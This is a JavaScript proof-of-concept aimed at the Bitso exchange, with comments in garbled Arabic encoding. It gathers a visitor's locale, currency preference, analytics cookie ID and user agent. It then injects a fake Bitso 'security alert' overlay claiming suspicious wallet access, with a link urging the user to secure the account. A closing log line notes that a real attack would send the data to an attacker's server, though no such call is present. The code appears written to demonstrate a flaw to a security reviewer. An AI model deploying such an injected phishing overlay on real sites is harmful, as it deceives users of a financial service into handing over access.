(function() {
    // === Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ù‚ÙŠÙ‚ÙŠØ© Ù…Ù† Bitso ===
    const attackContext = {
        url: window.location.href,
        locale: localStorage.getItem('NEXT_LOCALE') || 'ar',
        currency: localStorage.getItem('preferredCurrency') || 'MXN',
        deviceId: (document.cookie.match(/ajs_anonymous_id=([^;]+)/) || [null, 'unknown'])[1],
        userAgent: navigator.userAgent
    };

    // === Ø¹Ø±Ø¶ Ø£Ù† Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØªÙØ³ØªØ®Ø¯Ù… ÙÙŠ Ù‡Ø¬ÙˆÙ… Ø°ÙƒÙŠ ===
    console.log("[ğŸ¯ Bitso Phishing Context]", attackContext);

    // === Ø­Ù‚Ù† ØªØ­Ø°ÙŠØ± Ù…Ø²ÙŠÙ Ù…Ø®ØµØµ Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ===
    const personalizedMessage = 
        attackContext.locale === 'ar' 
            ? `ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù…Ø­Ø§ÙˆÙ„Ø© ÙˆØµÙˆÙ„ Ù…Ù† Ø¬Ù‡Ø§Ø² ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ Ø¥Ù„Ù‰ Ù…Ø­ÙØ¸ØªÙƒ Ø¨Ø§Ù„Ø¹Ù…Ù„Ø©: ${attackContext.currency}.`
            : `Suspicious access detected to your ${attackContext.currency} wallet.`;

    const fakeAlert = document.createElement('div');
    fakeAlert.innerHTML = `
        <div style="
            position: fixed;
            top: 20px;
            right: 20px;
            background: #fff8e1;
            border: 2px solid #ff9800;
            padding: 16px;
            border-radius: 8px;
            font-family: sans-serif;
            z-index: 999999;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            max-width: 420px;
            font-size: 14px;
            line-height: 1.4;
        ">
            <strong style="color: #e65100; display: block; margin-bottom: 6px;">âš ï¸ ØªÙ†Ø¨ÙŠÙ‡ Ø£Ù…Ù†ÙŠ Ù…Ù† Bitso</strong>
            ${personalizedMessage}<br>
            <a href="#" style="color: #1976d2; text-decoration: underline; display: inline-block; margin-top: 8px;">
                ØªØ£Ù…ÙŠÙ† Ø­Ø³Ø§Ø¨Ùƒ Ø§Ù„Ø¢Ù†
            </a>
        </div>
    `;
    document.body.appendChild(fakeAlert);

    // === Ù…Ù„Ø§Ø­Ø¸Ø© Ù„Ù„Ù…ÙØ±Ø§Ø¬ÙØ¹ Ø§Ù„Ø£Ù…Ù†ÙŠ (Ù„Ø§ ØªÙØ±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§Øª ÙØ¹Ù„ÙŠØ©) ===
    console.log("[â„¹ï¸] In a real attack, this context would be sent to the attacker's server to generate a tailored phishing page.");
})();
